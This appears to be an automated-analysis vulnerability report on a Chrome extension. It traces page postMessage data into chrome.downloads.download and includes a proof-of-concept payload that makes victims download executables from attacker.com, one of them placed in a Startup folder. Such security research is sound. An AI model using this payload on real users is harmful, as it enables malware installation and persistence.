# CoCo Analysis: emiplbkkiabideffmpogkbbogkmofgph

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (url and filename parameters, with multiple duplicate traces)

---

## Sink: cs_window_eventListener_message → chrome_downloads_download_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/emiplbkkiabideffmpogkbbogkmofgph/opgen_generated_files/cs_0.js
Line 477    window.addEventListener("message", function(event) {
Line 481    if (event.data.type && (event.data.type == "HTCOMNET_CHECK_EXT"))
Line 486    port.postMessage({files : event.data.files});

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/emiplbkkiabideffmpogkbbogkmofgph/opgen_generated_files/bg.js
Line 983    chrome.downloads.download({url:filesList[i].url, filename:filesList[i].path}

**Code:**

```javascript
// Content script - cs_0.js (lines 477-488)
window.addEventListener("message", function(event) {
    // We only accept messages from ourselves
    if (event.source != window)
        return;
    if (event.data.type && (event.data.type == "HTCOMNET_CHECK_EXT"))
        window.postMessage({ type: "HTCOMNET_EXT_RESPONSE", success: true,  message: "Extension available"}, "*");

    if (event.data.type && (event.data.type == "HTCOMNET_DOWNLOAD")) {
        console.log("Content script received: " + event.data.type);
        port.postMessage({files : event.data.files}); // ← attacker-controlled files array
    }
}, false);

// Background script - bg.js (lines 971-991)
chrome.runtime.onConnect.addListener(function(port) {
    console.log("connected");
    initOptions();
    port.onMessage.addListener(function(msg) {
        console.log("message in port popup.js");
        if (msg.files)
        {
            filesList = msg.files; // ← attacker-controlled array
            console.log("Files to download: "+msg.files.length);

            // Download all files
            if(!options.downloadByOne)
                for(var i = 0; i < filesList.length; i++)
                    chrome.downloads.download({
                        url:filesList[i].url,      // ← attacker-controlled URL
                        filename:filesList[i].path // ← attacker-controlled path
                    },
                    function(downloadId) {
                        filesList[i].did = downloadId;
                        chrome.downloads.pause(downloadId);
                    });
            downloadNextFile();
        }
    });
});

// Alternative download path (lines 993-1007)
function downloadNextFile(){
    var dItem;
    if(filesList.length > 0)
    {
        dItem = filesList.shift();
        if(options.downloadByOne)
            chrome.downloads.download({
                url:dItem.url,      // ← attacker-controlled URL
                filename: dItem.path // ← attacker-controlled path
            });
        else
            if(dItem && dItem.did)
                chrome.downloads.resume(dItem.did);
    }
    else
        console.log("all files downloaded");
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage in content script

**Attack:**

```javascript
// From any webpage matching the content script pattern (*Default.aspx*)
window.postMessage({
    type: "HTCOMNET_DOWNLOAD",
    files: [
        {
            url: "https://attacker.com/malware.exe",
            path: "Downloads/legit_looking_name.exe"
        },
        {
            url: "https://attacker.com/ransomware.exe",
            path: "Downloads/important_document.exe"
        },
        {
            url: "https://attacker.com/trojan.exe",
            path: "Startup/autorun.exe"  // Could place in startup folder
        }
    ]
}, "*");
```

**Impact:** Arbitrary file downloads with attacker-controlled URLs and paths. The attacker can:
1. **Download malware** from attacker-controlled URLs
2. **Control the filename and path** where files are saved (could target sensitive directories like Startup folder)
3. **Download multiple files** in a single attack
4. **Trigger the attack from any webpage** matching the content script pattern (*Default.aspx*)

This is a critical vulnerability as it allows complete control over the download operation, potentially leading to malware installation, phishing attacks, or other malicious file delivery.

---

## Additional Notes

**Content Script Matching:**
- The content script matches `"include_globs": ["*Default.aspx*"]` which restricts it to pages containing "Default.aspx"
- However, per the methodology, we **IGNORE manifest.json restrictions** on content script matching
- Any webpage can be named to include "Default.aspx" in the URL, making this exploitable

**Permission Check:**
- Extension has `"downloads"` permission in manifest.json, so the attack is feasible
